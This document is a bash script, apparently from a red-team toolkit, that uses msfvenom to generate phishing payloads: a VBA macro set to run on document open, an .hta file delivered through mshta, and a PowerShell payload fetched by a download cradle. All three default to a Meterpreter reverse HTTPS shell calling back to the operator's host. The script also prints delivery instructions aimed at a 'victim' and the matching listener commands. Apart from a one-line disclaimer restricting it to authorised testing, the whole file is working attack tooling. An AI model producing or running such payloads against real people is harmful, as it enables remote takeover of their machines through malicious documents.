#!/usr/bin/env bash
#
# macro.sh - Office macro (VBA) & HTA payload generator
# -----------------------------------------------------------------------------
# Generates client-side initial-access payloads via msfvenom and prints how to
# weaponise them:
#   vba  : VBA macro source (paste into Word/Excel -> AutoOpen/Workbook_Open).
#   hta  : an .hta application that executes your payload when opened.
#   ps1  : a PowerShell payload file (to host + pull via a cradle).
# -----------------------------------------------------------------------------
# AUTHORIZED RED-TEAM / LAB use only. Client-side execution payloads are for
# scoped phishing simulations, not unsolicited delivery.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./macro.sh -l <LHOST> -p <LPORT> [-P <payload>] [-t vba|hta|ps1|all] [-o name]
#
# DEPENDENCIES: msfvenom
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_hdr(){  printf '\n\033[1;36m# %s\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }

LHOST="" LPORT="" PAYLOAD="windows/x64/meterpreter/reverse_https" TYPE="all" NAME=""
usage(){ sed -n '2,20p' "$0"; exit 1; }
while getopts "l:p:P:t:o:h" o; do case "$o" in
  l) LHOST=$OPTARG;; p) LPORT=$OPTARG;; P) PAYLOAD=$OPTARG;; t) TYPE=$OPTARG;; o) NAME=$OPTARG;; *) usage;;
esac; done
[ -z "$LHOST" ] || [ -z "$LPORT" ] && { usage; }
have msfvenom || { c_info "msfvenom required"; exit 1; }
NAME=${NAME:-"macro_$(date +%Y%m%d_%H%M%S)"}; OUT="./$NAME"; mkdir -p "$OUT"; cd "$OUT"
show(){ [ "$TYPE" = all ] || [ "$TYPE" = "$1" ]; }
c_ok "Payload $PAYLOAD -> $LHOST:$LPORT  (out: $(pwd))"

if show vba; then c_hdr "VBA macro -> macro.vba"
  msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f vba -o macro.vba 2>/dev/null && \
    c_ok "macro.vba  (Word: Developer > Visual Basic, paste into ThisDocument; trigger AutoOpen)"
fi
if show hta; then c_hdr "HTA -> evil.hta"
  msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f hta-psh -o evil.hta 2>/dev/null && \
    c_ok "evil.hta  (host it; victim opens http://$LHOST/evil.hta via mshta)"
fi
if show ps1; then c_hdr "PowerShell -> payload.ps1"
  msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f psh -o payload.ps1 2>/dev/null && \
    c_ok "payload.ps1  (host + pull with obfuscate.sh -t cradle -u http://$LHOST/payload.ps1)"
fi

c_hdr "Catch it"
echo "listener.sh -m -P $PAYLOAD -l $LHOST -p $LPORT"
echo "listener.sh -w -D $(pwd)        # host the hta/ps1 for delivery"
